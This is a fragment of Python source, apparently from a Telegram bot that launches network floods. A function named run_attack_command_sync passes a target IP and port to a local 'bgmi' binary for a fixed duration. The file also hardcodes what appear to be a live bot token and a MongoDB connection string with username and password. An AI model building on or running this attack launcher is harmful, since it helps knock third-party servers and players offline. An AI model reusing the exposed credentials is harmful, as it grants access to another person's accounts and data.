...
TOKEN = '7484093482:AAEvvOehz5phUytF1eyejat8HQvfmfSBxxU'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
CHANNEL_ID = -1002212368721
ADMIN_IDS = [759580904]
...
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
